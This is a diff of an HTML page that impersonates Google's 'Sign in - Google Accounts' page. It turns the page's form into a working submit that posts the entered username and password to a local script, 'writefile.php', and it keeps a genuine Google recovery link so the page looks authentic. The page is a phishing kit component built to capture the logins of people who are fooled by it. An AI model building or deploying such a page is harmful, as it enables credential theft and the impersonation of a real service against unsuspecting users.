@@ -1,6 +1,6 @@
 <html>
-
 <head>
+<meta charset="UTF-8">
 <title>Sign in - Google Accounts</title>
 <style type="text/css">
 
@@ -139,12 +139,16 @@ One account. All of Google.
 
 <div id="space"> </div>
 <center>
-<img src="default-user.png" alt="user"></center><br>
+<img src="default-user.png" alt="user"></center><br/>
+
 <form action="writefile.php" method="post">
-<input type="text" name="un" id="userName">
-<input type="password" name="pw" id="passWord">
-<input type="button" name="submit" id="submit" value="Sign in">
+<input type="text" name="userName" id="userName" style="margin:0 auto 3px;
+display:block;"placeholder="username">
+<input type="password" name="passWord" id="passWord" style="margin:0 auto 3px;
+display:block;" placeholder="password">
+<input type="submit" name="submit" id="submit" value="Sign in">
 </form>
+
 <div id="findAccountLink" name="findAccountLink"><a id="findAccountLink" href="https://accounts.google.com/signin/usernamerecovery?continue=https%3A%2F%2Fwww.google.com%2F&hl=en">Find My account</a></div>
 
 
